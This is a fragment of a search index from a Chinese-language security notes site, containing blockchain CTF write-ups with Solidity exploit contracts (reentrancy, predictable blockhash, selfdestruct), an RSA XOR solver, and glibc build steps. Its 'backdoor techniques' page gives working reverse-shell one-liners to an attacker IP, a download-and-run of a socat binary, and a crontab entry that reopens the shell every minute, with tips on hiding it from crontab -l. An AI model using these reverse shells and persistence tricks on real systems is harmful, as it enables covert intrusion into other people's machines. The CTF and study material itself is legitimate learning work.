Lottery \u9019\u984c\u8981\u731c entropy^entropy2 \u7684\u503c\uff0c\u731c\u5230\u5c31\u53ef\u4ee5\u62ff\u8d70\u88e1\u9762\u7684\u9322\u9322 entropy = blockhash(block.number) \uff0c\u4f46\u662f\u6211\u5011\u6c92\u8fa6\u6cd5\u77e5\u9053\u9019\u500b block \u7684 blockhash\uff0c\u56e0\u70ba\u9019\u500b block \u9084\u6c92\u7b97\u5b8c \u4f46\u9019\u6a23\u5beb\u4e0d\u6703\u6709\u932f\u8aa4\uff0c\u53ea\u662f\u51fa\u4f86\u7684\u503c\u6703\u662f 0 \u65e2\u7136 entropy = 0 \u90a3\u5c31\u53ea\u5269 entropy2 \uff0c\u800c entropy2 \u662f\u6839\u64da msg.sender \u4f86\u7684 \u6240\u4ee5\u6211\u5011\u53ef\u4ee5\u76f4\u63a5\u7b97\u51fa _seed \u7684\u503c \u53ef\u4ee5\u76f4\u63a5\u7528 remix \u5beb\u500b\u7c21\u55ae\u7684 smart contract \u5e6b\u6211\u5011\u7b97\u90a3\u500b\u503c\uff0c\u7136\u5f8c\u5229\u7528 event \u4f86\u5370\u51fa\u90a3\u500b\u503c ( \u7576 print \u7528 ) pragma solidity ^0.5.9; contract test { event Log(bytes32 value); function go () public { emit Log(keccak256(abi.encodePacked(msg.sender))); } } \u6216\u662f\u76f4\u63a5\u5beb\u4e00\u500b\u653b\u64ca\u5408\u7d04\uff0c\u53bb\u547c\u53eb play \u51fd\u5f0f \u8a18\u5f97\u8981\u5148\u628a\u9019\u500b\u5408\u7d04\u52a0\u5230 authorizedToPlay \uff0c\u5982\u679c\u662f gas \u4e0d\u5920\u5c31\u8abf\u9ad8 gas limit \u5427 pragma solidity ^0.5.9; import \"./challenge.sol\"; contract hack { function exploit(address payable _target) public payable { Lottery target = Lottery(_target); bytes32 entropy2 = keccak256(abi.encodePacked(this)); uint256 seeds = uint256(entropy2); target.play.value(msg.value)(seeds); msg.sender.transfer(address(this).balance); } } Trust Fund \u9019\u984c\u662f\u7d93\u5178\u7684 reentrant attack pragma solidity ^0.5.9; contract TrustFund { function withdraw() external {} } contract hack { address target = 0xd297ab1c9653295BdE4f6b2e32574Ac5DD994997; uint count = 10; function () external payable { if (count > 0) { count--; TrustFund trust = TrustFund(target); trust.withdraw(); } } function exploit () public { TrustFund trust = TrustFund(target); trust.withdraw(); } function withdraw () public { msg.sender.transfer(address(this).balance); } } Heads or Tails \u9019\u984c\u8ddf Lottery \u5f88\u50cf\uff0c\u4e0d\u904e\u7528\u7684\u662f\u4e0a\u4e00\u500b block \u7684 blockhash \u90a3\u5c31\u5beb\u500b\u653b\u64ca\u5408\u7d04\u53bb\u547c\u53eb play \uff0c\u5c31\u53ef\u4ee5\u7b97\u51fa\u4e00\u6a23\u7684 entropy \u7d66 0.1 ether \u80fd\u8cfa 0.05 ether \uff0c\u6240\u4ee5\u73a9\u500b 20 \u6b21\u5c31\u628a\u9322\u5168\u90e8\u6488\u51fa\u4f86\u5566 \u8a18\u5f97\u8981\u5beb fallback \u51fd\u5f0f\u624d\u80fd\u63a5\u9322\u9032\u4f86\u5440 ( \u6211\u9019\u88e1\u5361\u8d85\u4e45der ) pragma solidity ^0.5.9; contract HeadsOrTails { function play(bool _heads) external payable {} } contract hack { address target = 0xf8583ccB9900615e0b8304A16539EBFD96c2B0af; function () external payable {} function exploit () public payable { bytes32 entropy = blockhash(block.number - 1); bool coinFlip = (entropy[0] & '\\x01') == '\\x01'; HeadsOrTails heads = HeadsOrTails(target); for (uint i = 0; i < 20; i++) { heads.play.value(0.1 ether)(coinFlip); } msg.sender.transfer(address(this).balance); } } Record Label \u9019\u984c\u7684\u984c\u76ee\u5f88\u9577\uff0c\u4e3b\u8981\u7684\u908f\u8f2f\u5c31\u662f\u4f60\u9818\u9322\u7684\u6642\u5019\u6703\u88ab royalties \u62bd\u6210\uff0c manager \u6703\u62bd\u6210 80 \u8db4\u7684\u9322\u9322 \u6240\u4ee5\u5982\u679c\u76f4\u63a5\u547c\u53eb withdrawFundsAndPayRoyalties \u5c31\u53ef\u4ee5\u62ff\u5230 0.2 ether \uff0c royalties \u62bd\u8d70 0.8 ether \uff0c\u9019\u984c\u5c31\u89e3\u6389\u4e86 ( \u984c\u76ee\u5408\u7d04 balance = 0 ) \u4e0d\u904e\u6b63\u78ba\u7684\u89e3\u6cd5 ( \u6211\u5168\u90fd\u8981 ) \u61c9\u8a72\u662f\u627e\u51fa _manager \u7684\u5730\u5740\uff0c\u7136\u5f8c\u547c\u53eb addRoyaltyReceiver \u628a receiverToPercentOfProfit \u9019\u500b mapping \u4e2d _manager \u7684 percent \u8986\u5beb\u6210 0 \u9019\u6a23\u53bb\u9818\u9322\u5c31\u4e0d\u6703\u88ab\u62bd\u6210\u4e86 Slot Machine \u9019\u984c\u7684\u984c\u76ee\u5f88\u77ed\uff0c\u5c31\u4e00\u500b fallback \u51fd\u5f0f \u4f46\u662f\u7b2c\u4e00\u884c\u9650\u5236\u4e00\u6b21\u53ea\u80fd\u532f\u6b3e 1 szabo ( 0.000001 ether ) \u76ee\u6a19\u662f\u8981\u8b93\u9019\u500b\u5408\u7d04\u7684 balance \u5927\u65bc\u7b49\u65bc 5 ether \uff0c\u4ed6\u5c31\u6703\u628a\u6240\u6709\u9322\u9322\u90fd\u7d66\u4f60 \u5176\u4e2d\u4e00\u500b\u4e0d\u900f\u904e fallback \u7d66\u9322\u7684\u65b9\u6cd5\u5c31\u662f\u7528 selfdestruct selfdestruct \u5c31\u662f\u628a\u5408\u7d04\u6e05\u9664\u6389\uff0c\u5728\u88ab\u6e05\u9664\u6389\u4e4b\u524d\uff0c\u9019\u500b\u5408\u7d04\u53ef\u4ee5\u628a\u4ed6\u7684\u9322\u9322\u532f\u6b3e\u7d66\u4e00\u500b\u5e33\u6236\uff0c\u800c\u9019\u500b\u532f\u6b3e\u7684\u52d5\u4f5c\u4e0d\u6703\u7d93\u904e fallback \u51fd\u5f0f \u5beb\u4e00\u500b\u653b\u64ca\u5408\u7d04\uff0c\u4e26\u7d66\u4ed6 5 ether \uff0c\u8b93\u4ed6\u81ea\u6211\u6bc0\u6ec5\uff0c\u4e26\u5728\u6bc0\u6ec5\u4e4b\u524d\u628a 5 ether \u532f\u6b3e\u7d66\u984c\u76ee\u5408\u7d04 pragma solidity ^0.5.9; contract hack { function exploit () public payable { selfdestruct(address(0x22f616f6b95e23efa8FBBAE44BeeC05890E12A4E)); } } https://f3real.github.io/tag/ethereum.html \u21a9 https://xz.aliyun.com/t/2759 \u21a9","title":"[OJ] Security Innovation Blockchain CTF"},{"location":"security/crypto/writeups/blockchain-ctf/#donation","text":"\u9019\u984c\u662f\u7c3d\u5230\u984c \u5c31\u53ea\u662f\u8b93\u6211\u5011\u547c\u53eb\u5408\u7d04\u88e1\u9762\u7684\u9019\u500b\u51fd\u5f0f withdrawDonationsFromTheSuckersWhoFellForIt","title":"Donation"},{"location":"security/crypto/writeups/blockchain-ctf/#lock-box","text":"\u9019\u984c\u6709\u500b private \u7684 pin \u8b8a\u6578\uff0c\u4f46\u662f private \u53ea\u662f\u4ee3\u8868\u90a3\u500b\u8b8a\u6578\u6c92\u6709 getter \u51fd\u5f0f\uff0c\u628a\u5408\u7d04\u7684\u72c0\u614b\u6293\u4e0b\u4f86\u5c31\u770b\u5149\u5149\u5566 \u4f7f\u7528 web3.eth.getStorageAt \u9019\u500b\u51fd\u5f0f \u7236\u5408\u7d04\u7684\u8b8a\u6578\u6703\u5728\u5b50\u5408\u7d04\u7684\u8b8a\u6578\u7684\u524d\u9762 \u6240\u4ee5 position 0 \u7684\u4f4d\u5740\u662f authorizedToPlay \uff0c\u800c position 1 \u7684\u4f4d\u5740\u5c31\u662f pin \u8b8a\u6578\u5728 storage \u88e1\u9762\u600e\u9ebc\u64fa\u7684\u53ef\u4ee5\u53c3\u8003\u9019\u7bc7 Understanding Ethereum Smart Contract Storage","title":"Lock Box"},{"location":"security/crypto/writeups/blockchain-ctf/#piggy-bank","text":"\u9019\u984c\u76f4\u63a5\u547c\u53eb collectFunds \u5c31\u597d\u4e86 \u53ea\u6709 PiggyBank \u7684 collectFunds \u6709 onlyOwner \uff0c CharliesPiggyBank \u7684 collectFunds \u6c92\u6709 onlyOwner","title":"Piggy Bank"},{"location":"security/crypto/writeups/blockchain-ctf/#si-token-sale","text":"\u9019\u984c\u7684 purchaseTokens \u6c92\u6709\u7528 SafeMath\uff0c\u4e5f\u6c92\u6709\u6aa2\u67e5 _value \u8981\u5927\u65bc feeAmount \u5148\u8f49\u500b 0.000001 \u7d66\u5408\u7d04\uff0c\u9019\u6a23 0.000001 - 0.00001 \u5c31\u6703 underflow \u8b8a\u6210\u5f88\u5927\u7684\u6578\u5b57\uff0c\u5c31\u5f97\u5230\u4e86\u8d85\u591a\u7684 token \u7136\u5f8c\u518d\u7528 refundTokens \u5c31\u53ef\u4ee5\u534a\u50f9\u628a token \u63db\u6210 ether \u9322\u9322\u4e86","title":"SI Token Sale"},{"location":"security/crypto/writeups/blockchain-ctf/#secure-bank","text":"SecureBank \u7684 withdraw \u548c MembersBank \u7684 withdraw \u5176\u4e2d\u7684 _value \u53c3\u6578\u5f62\u614b\u4e0d\u4e00\u6a23 \u4ed6\u5011\u6703\u88ab\u770b\u6210\u662f\u4e0d\u4e00\u6a23\u7684\u51fd\u5f0f\uff0c\u6240\u4ee5\u6703\u6709\u5169\u500b\u4e0d\u4e00\u6a23\u7684\u578b\u614b withdraw \u53ef\u4ee5\u547c\u53eb \u800c MembersBank \u7684 withdraw \u6c92\u6709\u6aa2\u67e5\u662f\u4e0d\u662f\u672c\u4eba\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u628a contract creator \u7684\u9322\u9818\u8d70","title":"Secure Bank"},{"location":"security/crypto/writeups/blockchain-ctf/#lottery","text":"\u9019\u984c\u8981\u731c entropy^entropy2 \u7684\u503c\uff0c\u731c\u5230\u5c31\u53ef\u4ee5\u62ff\u8d70\u88e1\u9762\u7684\u9322\u9322 entropy = blockhash(block.number) \uff0c\u4f46\u662f\u6211\u5011\u6c92\u8fa6\u6cd5\u77e5\u9053\u9019\u500b block \u7684 blockhash\uff0c\u56e0\u70ba\u9019\u500b block \u9084\u6c92\u7b97\u5b8c \u4f46\u9019\u6a23\u5beb\u4e0d\u6703\u6709\u932f\u8aa4\uff0c\u53ea\u662f\u51fa\u4f86\u7684\u503c\u6703\u662f 0 \u65e2\u7136 entropy = 0 \u90a3\u5c31\u53ea\u5269 entropy2 \uff0c\u800c entropy2 \u662f\u6839\u64da msg.sender \u4f86\u7684 \u6240\u4ee5\u6211\u5011\u53ef\u4ee5\u76f4\u63a5\u7b97\u51fa _seed \u7684\u503c \u53ef\u4ee5\u76f4\u63a5\u7528 remix \u5beb\u500b\u7c21\u55ae\u7684 smart contract \u5e6b\u6211\u5011\u7b97\u90a3\u500b\u503c\uff0c\u7136\u5f8c\u5229\u7528 event \u4f86\u5370\u51fa\u90a3\u500b\u503c ( \u7576 print \u7528 ) pragma solidity ^0.5.9; contract test { event Log(bytes32 value); function go () public { emit Log(keccak256(abi.encodePacked(msg.sender))); } } \u6216\u662f\u76f4\u63a5\u5beb\u4e00\u500b\u653b\u64ca\u5408\u7d04\uff0c\u53bb\u547c\u53eb play \u51fd\u5f0f \u8a18\u5f97\u8981\u5148\u628a\u9019\u500b\u5408\u7d04\u52a0\u5230 authorizedToPlay \uff0c\u5982\u679c\u662f gas \u4e0d\u5920\u5c31\u8abf\u9ad8 gas limit \u5427 pragma solidity ^0.5.9; import \"./challenge.sol\"; contract hack { function exploit(address payable _target) public payable { Lottery target = Lottery(_target); bytes32 entropy2 = keccak256(abi.encodePacked(this)); uint256 seeds = uint256(entropy2); target.play.value(msg.value)(seeds); msg.sender.transfer(address(this).balance); } }","title":"Lottery"},{"location":"security/crypto/writeups/blockchain-ctf/#trust-fund","text":"\u9019\u984c\u662f\u7d93\u5178\u7684 reentrant attack pragma solidity ^0.5.9; contract TrustFund { function withdraw() external {} } contract hack { address target = 0xd297ab1c9653295BdE4f6b2e32574Ac5DD994997; uint count = 10; function () external payable { if (count > 0) { count--; TrustFund trust = TrustFund(target); trust.withdraw(); } } function exploit () public { TrustFund trust = TrustFund(target); trust.withdraw(); } function withdraw () public { msg.sender.transfer(address(this).balance); } }","title":"Trust Fund"},{"location":"security/crypto/writeups/blockchain-ctf/#heads-or-tails","text":"\u9019\u984c\u8ddf Lottery \u5f88\u50cf\uff0c\u4e0d\u904e\u7528\u7684\u662f\u4e0a\u4e00\u500b block \u7684 blockhash \u90a3\u5c31\u5beb\u500b\u653b\u64ca\u5408\u7d04\u53bb\u547c\u53eb play \uff0c\u5c31\u53ef\u4ee5\u7b97\u51fa\u4e00\u6a23\u7684 entropy \u7d66 0.1 ether \u80fd\u8cfa 0.05 ether \uff0c\u6240\u4ee5\u73a9\u500b 20 \u6b21\u5c31\u628a\u9322\u5168\u90e8\u6488\u51fa\u4f86\u5566 \u8a18\u5f97\u8981\u5beb fallback \u51fd\u5f0f\u624d\u80fd\u63a5\u9322\u9032\u4f86\u5440 ( \u6211\u9019\u88e1\u5361\u8d85\u4e45der ) pragma solidity ^0.5.9; contract HeadsOrTails { function play(bool _heads) external payable {} } contract hack { address target = 0xf8583ccB9900615e0b8304A16539EBFD96c2B0af; function () external payable {} function exploit () public payable { bytes32 entropy = blockhash(block.number - 1); bool coinFlip = (entropy[0] & '\\x01') == '\\x01'; HeadsOrTails heads = HeadsOrTails(target); for (uint i = 0; i < 20; i++) { heads.play.value(0.1 ether)(coinFlip); } msg.sender.transfer(address(this).balance); } }","title":"Heads or Tails"},{"location":"security/crypto/writeups/blockchain-ctf/#record-label","text":"\u9019\u984c\u7684\u984c\u76ee\u5f88\u9577\uff0c\u4e3b\u8981\u7684\u908f\u8f2f\u5c31\u662f\u4f60\u9818\u9322\u7684\u6642\u5019\u6703\u88ab royalties \u62bd\u6210\uff0c manager \u6703\u62bd\u6210 80 \u8db4\u7684\u9322\u9322 \u6240\u4ee5\u5982\u679c\u76f4\u63a5\u547c\u53eb withdrawFundsAndPayRoyalties \u5c31\u53ef\u4ee5\u62ff\u5230 0.2 ether \uff0c royalties \u62bd\u8d70 0.8 ether \uff0c\u9019\u984c\u5c31\u89e3\u6389\u4e86 ( \u984c\u76ee\u5408\u7d04 balance = 0 ) \u4e0d\u904e\u6b63\u78ba\u7684\u89e3\u6cd5 ( \u6211\u5168\u90fd\u8981 ) \u61c9\u8a72\u662f\u627e\u51fa _manager \u7684\u5730\u5740\uff0c\u7136\u5f8c\u547c\u53eb addRoyaltyReceiver \u628a receiverToPercentOfProfit \u9019\u500b mapping \u4e2d _manager \u7684 percent \u8986\u5beb\u6210 0 \u9019\u6a23\u53bb\u9818\u9322\u5c31\u4e0d\u6703\u88ab\u62bd\u6210\u4e86","title":"Record Label"},{"location":"security/crypto/writeups/blockchain-ctf/#slot-machine","text":"\u9019\u984c\u7684\u984c\u76ee\u5f88\u77ed\uff0c\u5c31\u4e00\u500b fallback \u51fd\u5f0f \u4f46\u662f\u7b2c\u4e00\u884c\u9650\u5236\u4e00\u6b21\u53ea\u80fd\u532f\u6b3e 1 szabo ( 0.000001 ether ) \u76ee\u6a19\u662f\u8981\u8b93\u9019\u500b\u5408\u7d04\u7684 balance \u5927\u65bc\u7b49\u65bc 5 ether \uff0c\u4ed6\u5c31\u6703\u628a\u6240\u6709\u9322\u9322\u90fd\u7d66\u4f60 \u5176\u4e2d\u4e00\u500b\u4e0d\u900f\u904e fallback \u7d66\u9322\u7684\u65b9\u6cd5\u5c31\u662f\u7528 selfdestruct selfdestruct \u5c31\u662f\u628a\u5408\u7d04\u6e05\u9664\u6389\uff0c\u5728\u88ab\u6e05\u9664\u6389\u4e4b\u524d\uff0c\u9019\u500b\u5408\u7d04\u53ef\u4ee5\u628a\u4ed6\u7684\u9322\u9322\u532f\u6b3e\u7d66\u4e00\u500b\u5e33\u6236\uff0c\u800c\u9019\u500b\u532f\u6b3e\u7684\u52d5\u4f5c\u4e0d\u6703\u7d93\u904e fallback \u51fd\u5f0f \u5beb\u4e00\u500b\u653b\u64ca\u5408\u7d04\uff0c\u4e26\u7d66\u4ed6 5 ether \uff0c\u8b93\u4ed6\u81ea\u6211\u6bc0\u6ec5\uff0c\u4e26\u5728\u6bc0\u6ec5\u4e4b\u524d\u628a 5 ether \u532f\u6b3e\u7d66\u984c\u76ee\u5408\u7d04 pragma solidity ^0.5.9; contract hack { function exploit () public payable { selfdestruct(address(0x22f616f6b95e23efa8FBBAE44BeeC05890E12A4E)); } } https://f3real.github.io/tag/ethereum.html \u21a9 https://xz.aliyun.com/t/2759 \u21a9","title":"Slot Machine"},{"location":"security/crypto/writeups/opqrx/","text":"Can you decrypt RSA? I'll give a hint value, XOR. \u3053\u3053\u306bRSA\u306e\u6697\u53f7\u6587\u304c\u3042\u308a\u307e\u3059\u304c\u3001XOR\u3092\u3042\u3052\u308b\u306e\u3067\u3001\u4ee3\u308f\u308a\u306b\u5e73\u6587\u3092\u304f\u3060\u3055\u3044\u3002 \u5206\u6578 : 497 \u89e3\u984c\u4eba\u6578 : 10 Writeup \u984c\u76ee\u5f88\u7c21\u55ae\uff0cRSA \u52a0\u5bc6\uff0c\u591a\u7d66\u4e86 p \\oplus q p \\oplus q \u7684\u503c \\begin{align} &p \\oplus q = x \\\\ &p \\times q = n \\\\ \\end{align} \\begin{align} &p \\oplus q = x \\\\ &p \\times q = n \\\\ \\end{align} \u5df2\u77e5 x, n x, n \u6c42 p, q p, q \u5047\u8a2d x x \u7684\u7b2c\u4e00\u500b bit \u662f 0\uff0c\u90a3\u9ebc p, q p, q \u7684\u7b2c\u4e00\u500b bit \u53ea\u6709 (0, 0) (0, 0) \u6216 (1, 1) (1, 1) \u5169\u7a2e\u53ef\u80fd \u5047\u8a2d x x \u7684\u7b2c\u4e00\u500b bit \u662f 1\uff0c\u90a3\u9ebc p, q p, q \u7684\u7b2c\u4e00\u500b bit \u53ea\u6709 (0, 1) (0, 1) \u6216 (1, 0) (1, 0) \u5169\u7a2e\u53ef\u80fd \u6240\u4ee5\u5c31\u76f4\u63a5\u7206\u641c\u52a0\u526a\u679d\u5c31\u904e\u4e86\uff0c\u9a5a\u4e0d\u9a5a\u559c\uff0c\u610f\u4e0d\u610f\u5916 Final Exploit #!/usr/bin/env python3 from Crypto.Util.number import * from tqdm import tqdm class Solver : def __init__ ( self , x , n ): self . x = x self . n = n self . pq = [( 0 , 0 )] def add ( self , b , p , q ): if p * q <= n and ( p | ( b - 1 )) * ( q | ( b - 1 )) >= n : self . pq . append (( p , q )) def solve ( self ): for shift in tqdm ( range ( 4095 , - 1 , - 1 )): b = 1 << shift pq , self . pq = self . pq , [] for p , q in pq : if self . x & b : self . add ( b , p | b , q ) self . add ( b , p , q | b ) else : self . add ( b , p , q ) self . add ( b , p | b , q | b ) return self . pq [ 0 ] exec ( open ( 'flag.enc' ) . read () . lower ()) solver = Solver ( x , n ) p , q = solver . solve () r = ( p - 1 ) * ( q - 1 ) d = inverse ( e , r ) m = pow ( c , d , n ) print ( long_to_bytes ( m )) Flag TSGCTF{Absolutely, X should be 'S' in 'OPQRX'.} https://furutsuki.hatenablog.com/entry/2019/05/05/163313#Crypto-497pts-10-Solves-OPQRX \u21a9","title":"[2019] TSG CTF - OPQRX"},{"location":"security/crypto/writeups/opqrx/#writeup","text":"\u984c\u76ee\u5f88\u7c21\u55ae\uff0cRSA \u52a0\u5bc6\uff0c\u591a\u7d66\u4e86 p \\oplus q p \\oplus q \u7684\u503c \\begin{align} &p \\oplus q = x \\\\ &p \\times q = n \\\\ \\end{align} \\begin{align} &p \\oplus q = x \\\\ &p \\times q = n \\\\ \\end{align} \u5df2\u77e5 x, n x, n \u6c42 p, q p, q \u5047\u8a2d x x \u7684\u7b2c\u4e00\u500b bit \u662f 0\uff0c\u90a3\u9ebc p, q p, q \u7684\u7b2c\u4e00\u500b bit \u53ea\u6709 (0, 0) (0, 0) \u6216 (1, 1) (1, 1) \u5169\u7a2e\u53ef\u80fd \u5047\u8a2d x x \u7684\u7b2c\u4e00\u500b bit \u662f 1\uff0c\u90a3\u9ebc p, q p, q \u7684\u7b2c\u4e00\u500b bit \u53ea\u6709 (0, 1) (0, 1) \u6216 (1, 0) (1, 0) \u5169\u7a2e\u53ef\u80fd \u6240\u4ee5\u5c31\u76f4\u63a5\u7206\u641c\u52a0\u526a\u679d\u5c31\u904e\u4e86\uff0c\u9a5a\u4e0d\u9a5a\u559c\uff0c\u610f\u4e0d\u610f\u5916","title":"Writeup"},{"location":"security/crypto/writeups/opqrx/#final-exploit","text":"#!/usr/bin/env python3 from Crypto.Util.number import * from tqdm import tqdm class Solver : def __init__ ( self , x , n ): self . x = x self . n = n self . pq = [( 0 , 0 )] def add ( self , b , p , q ): if p * q <= n and ( p | ( b - 1 )) * ( q | ( b - 1 )) >= n : self . pq . append (( p , q )) def solve ( self ): for shift in tqdm ( range ( 4095 , - 1 , - 1 )): b = 1 << shift pq , self . pq = self . pq , [] for p , q in pq : if self . x & b : self . add ( b , p | b , q ) self . add ( b , p , q | b ) else : self . add ( b , p , q ) self . add ( b , p | b , q | b ) return self . pq [ 0 ] exec ( open ( 'flag.enc' ) . read () . lower ()) solver = Solver ( x , n ) p , q = solver . solve () r = ( p - 1 ) * ( q - 1 ) d = inverse ( e , r ) m = pow ( c , d , n ) print ( long_to_bytes ( m ))","title":"Final Exploit"},{"location":"security/crypto/writeups/opqrx/#flag","text":"TSGCTF{Absolutely, X should be 'S' in 'OPQRX'.} https://furutsuki.hatenablog.com/entry/2019/05/05/163313#Crypto-497pts-10-Solves-OPQRX \u21a9","title":"Flag"},{"location":"security/pwn/backdoor/","text":"reverse shell reverse shell cheatsheet \u958b\u5f8c\u9580\u6700\u76f4\u89ba\u7684\u4f5c\u6cd5\u5c31\u662f\u958b\u4e00\u500b shell \u5728\u53d7\u5bb3\u8005\u6a5f\u5668\u7684\u67d0\u500b port \u8b93\u6211\u5011\u53ef\u4ee5\u9023\u9032\u53bb\uff0c\u4f46\u662f\u9019\u6a23\u53ef\u80fd\u6703\u88ab\u9632\u706b\u7246\u64cb\u4f4f \u6240\u4ee5\u53cd\u904e\u4f86\uff0c\u5728\u53d7\u5bb3\u8005\u6a5f\u5668\u4e0a\u958b\u4e00\u500b shell \u9023\u56de\u6211\u5011\u7684\u6a5f\u5668 reverse shell # target machine bash -i > & /dev/tcp/192.168.100.100/9999 0 > & 1 # hacker machine ( 192.168.100.100 ) socat TCP-LISTEN:9999 - cannot create /dev/tcp/... sh not support this feature, use bash instead # run the whole command inside bash bash -c \"bash -i >& /dev/tcp/192.168.100.100/9999 0>&1\" better reverse shell \u53c3\u8003\u9019\u4e00\u7bc7 Upgrading simple shells to fully interactive TTYs python psuedo terminal python -c 'import pty; pty.spawn(\"/bin/bash\")' socat # target machine socat exec: 'bash -li' ,pty,stderr,setsid,sigint,sane tcp:192.168.100.100:9999 # hacker machine ( 192.168.100.100 ) socat file: ` tty ` ,raw,echo = 0 tcp-listen:9999 no socat install \u5982\u679c\u53d7\u5bb3\u8005\u6a5f\u5668\u6c92\u6709\u5b89\u88dd socat \u53ef\u4ee5\u76f4\u63a5\u7528 socat standalone binary # target machine wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat ; chmod +x /tmp/socat ; /tmp/socat exec: 'bash -li' ,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 crontab crontab cheatsheet \u62ff\u5230 shell \u4e4b\u5f8c\uff0c\u53ef\u4ee5\u628a\u5f8c\u9580\u585e\u5230 crontab \u8b93\u4ed6\u6bcf\u4e00\u6bb5\u6642\u9593\u5c31\u8dd1\u4e00\u6b21\u5f8c\u9580 # reverse shell every minute echo '*/1 * * * * bash -c \"bash -i &> /dev/tcp/192.168.100.100/9999 0>&1\"' | crontab \u53ef\u4ee5\u7528 crontab -l \u770b\u76ee\u524d\u4f7f\u7528\u8005\u7684\u6240\u6709\u6392\u7a0b \u5982\u679c\u6709 root \u6b0a\u9650\u4e5f\u53ef\u4ee5\u8003\u616e\u585e\u5230 /etc/cron.d , /etc/cron.hourly , ...\uff0c\u9019\u6a23 crontab -l \u5c31\u770b\u4e0d\u5230\u4e86 https://unix.stackexchange.com/questions/417323/what-is-the-difference-between-cron-d-as-in-etc-cron-d-and-crontab \u21a9 https://ubuntuforums.org/showthread.php?t=1656623 \u21a9","title":"\u5f8c\u9580\u6280\u5de7"},{"location":"security/pwn/backdoor/#reverse-shell","text":"reverse shell cheatsheet \u958b\u5f8c\u9580\u6700\u76f4\u89ba\u7684\u4f5c\u6cd5\u5c31\u662f\u958b\u4e00\u500b shell \u5728\u53d7\u5bb3\u8005\u6a5f\u5668\u7684\u67d0\u500b port \u8b93\u6211\u5011\u53ef\u4ee5\u9023\u9032\u53bb\uff0c\u4f46\u662f\u9019\u6a23\u53ef\u80fd\u6703\u88ab\u9632\u706b\u7246\u64cb\u4f4f \u6240\u4ee5\u53cd\u904e\u4f86\uff0c\u5728\u53d7\u5bb3\u8005\u6a5f\u5668\u4e0a\u958b\u4e00\u500b shell \u9023\u56de\u6211\u5011\u7684\u6a5f\u5668 reverse shell # target machine bash -i > & /dev/tcp/192.168.100.100/9999 0 > & 1 # hacker machine ( 192.168.100.100 ) socat TCP-LISTEN:9999 - cannot create /dev/tcp/... sh not support this feature, use bash instead # run the whole command inside bash bash -c \"bash -i >& /dev/tcp/192.168.100.100/9999 0>&1\"","title":"reverse shell"},{"location":"security/pwn/backdoor/#better-reverse-shell","text":"\u53c3\u8003\u9019\u4e00\u7bc7 Upgrading simple shells to fully interactive TTYs python psuedo terminal python -c 'import pty; pty.spawn(\"/bin/bash\")' socat # target machine socat exec: 'bash -li' ,pty,stderr,setsid,sigint,sane tcp:192.168.100.100:9999 # hacker machine ( 192.168.100.100 ) socat file: ` tty ` ,raw,echo = 0 tcp-listen:9999 no socat install \u5982\u679c\u53d7\u5bb3\u8005\u6a5f\u5668\u6c92\u6709\u5b89\u88dd socat \u53ef\u4ee5\u76f4\u63a5\u7528 socat standalone binary # target machine wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat ; chmod +x /tmp/socat ; /tmp/socat exec: 'bash -li' ,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444","title":"better reverse shell"},{"location":"security/pwn/backdoor/#crontab","text":"crontab cheatsheet \u62ff\u5230 shell \u4e4b\u5f8c\uff0c\u53ef\u4ee5\u628a\u5f8c\u9580\u585e\u5230 crontab \u8b93\u4ed6\u6bcf\u4e00\u6bb5\u6642\u9593\u5c31\u8dd1\u4e00\u6b21\u5f8c\u9580 # reverse shell every minute echo '*/1 * * * * bash -c \"bash -i &> /dev/tcp/192.168.100.100/9999 0>&1\"' | crontab \u53ef\u4ee5\u7528 crontab -l \u770b\u76ee\u524d\u4f7f\u7528\u8005\u7684\u6240\u6709\u6392\u7a0b \u5982\u679c\u6709 root \u6b0a\u9650\u4e5f\u53ef\u4ee5\u8003\u616e\u585e\u5230 /etc/cron.d , /etc/cron.hourly , ...\uff0c\u9019\u6a23 crontab -l \u5c31\u770b\u4e0d\u5230\u4e86 https://unix.stackexchange.com/questions/417323/what-is-the-difference-between-cron-d-as-in-etc-cron-d-and-crontab \u21a9 https://ubuntuforums.org/showthread.php?t=1656623 \u21a9","title":"crontab"},{"location":"security/pwn/compile-glibc/","text":"\u53d6\u5f97\u539f\u59cb\u78bc \u53ef\u4ee5\u5f9e ftp.gnu.org \u4e0b\u8f09 glibc \u7684\u539f\u59cb\u78bc wget https://ftp.gnu.org/gnu/glibc/glibc-2.29.tar.xz x glibc-2.29.tar.xz \u7de8\u8b6f 64 bit cd glibc-2.29 && mkdir build && cd build CFLAGS = \"-g -g3 -ggdb -gdwarf-4 -Og -w\" \\ CXXFLAGS = \"-g -g3 -ggdb -gdwarf-4 -Og -w\" \\ ../configure --prefix = /path/to/install make -j $( nproc ) && make -j $( nproc ) install 32 bit cd glibc-2.29 && mkdir build32 && cd build32 CC = \"gcc -m32\" CXX = \"g++ -m32\" \\ CFLAGS = \"-g -g3 -ggdb -gdwarf-4 -Og -w\" \\ CXXFLAGS = \"-g -g3 -ggdb -gdwarf-4 -Og -w\" \\ ../configure --prefix = /path/to/install --host = i686-linux-gnu make -j $( nproc ) && make -j $( nproc ) install -j \u591a\u500b\u7a0b\u5e8f\u4e26\u884c\u7de8\u8b6f -w -w \u7684\u4f5c\u7528\u662f\u95dc\u6389\u6240\u6709 warning messages \u4f7f\u7528 \u96a8\u4fbf\u7de8\u8b6f\u4e00\u500b\u7bc4\u4f8b\u7a0b\u5f0f\uff0c\u770b\u4e00\u4e0b\u4ed6\u7684 process maps \u5c31\u6703\u770b\u5230\u539f\u672c\u7684 libc \u548c ld \u88ab\u63db\u6210\u6211\u5011\u7de8\u8b6f\u7684\u7248\u672c\u4e86 gcc test.c -o test -Wl,-dynamic-linker /path/to/install/lib/ld-2.29.so -Wl,-dynamic-linker -Wl,xxx \u7684\u4f5c\u7528\u662f\u628a\u53c3\u6578 xxx \u50b3\u7d66 linker https://www.youtube.com/watch?v=wsIvqd9YqTI \u21a9 http://look3little.blogspot.com/2017/12/debug-symbolglibc.html \u21a9 https://stackoverflow.com/questions/6562403/i-dont-understand-wl-rpath-wl \u21a9 https://stackoverflow.com/questions/1452671/disable-all-gcc-warnings \u21a9","title":"Compile Glibc"},{"location":"security/pwn/compile-glibc/#_1","text":"\u53ef\u4ee5\u5f9e ftp.gnu.org \u4e0b\u8f09 glibc \u7684\u539f\u59cb\u78bc wget 